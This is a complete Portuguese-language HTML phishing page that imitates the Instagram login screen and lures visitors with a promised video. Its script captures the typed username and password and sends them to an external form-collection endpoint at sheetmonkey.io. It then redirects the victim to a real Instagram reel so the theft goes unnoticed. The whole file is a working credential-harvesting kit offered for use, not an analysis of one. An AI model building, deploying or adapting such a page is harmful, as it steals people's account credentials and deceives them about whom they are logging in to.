<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <meta property="og:title" content="Vídeo do Instagram">
    <meta property="og:description" content="Assista a este vídeo incrível no Instagram.">
    <meta property="og:image" content="URL_DA_IMAGEM_DA_CAPA_DO_VIDEO">
    <meta property="og:url" content="https://seusite.com">
    <meta property="og:type" content="website">

    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }

        .container {
            width: 350px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            height: 51px;
        }

        .form-login {
            width: 100%;
        }

        .form-login input {
            width: 100%;
            padding: 10px;
            margin-bottom: 5px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }

        .form-login button {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        .links {
            margin-top: 20px;
            text-align: center;
        }

        .links a {
            text-decoration: none;
            color: #0095f6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
        </div>
        <form class="form-login" id="loginForm">
            <input type="text" name="username" placeholder="Telefone, nome de usuário ou email">
            <input type="password" name="password" placeholder="Senha">
            <button type="submit">Entrar</button>
        </form>
        <div class="links">
            <a href="#">Esqueceu a senha?</a>
            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const formData = new FormData(this);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });

            fetch('https://api.sheetmonkey.io/form/pJZCcZ9aABKDXHJCQmbDrc', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (response.ok) {
                    this.reset(); // Clear the form
                    window.location.href = 'https://www.instagram.com/reel/DHFH_QfRiIg/?igsh=MWF0NHF5c3ZoOHZzNA=='; // Redirect
                } else {
                    alert('Erro ao enviar os dados.');
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                alert('Erro ao enviar os dados.');
            });
        });
    </script>
</body>
</html>
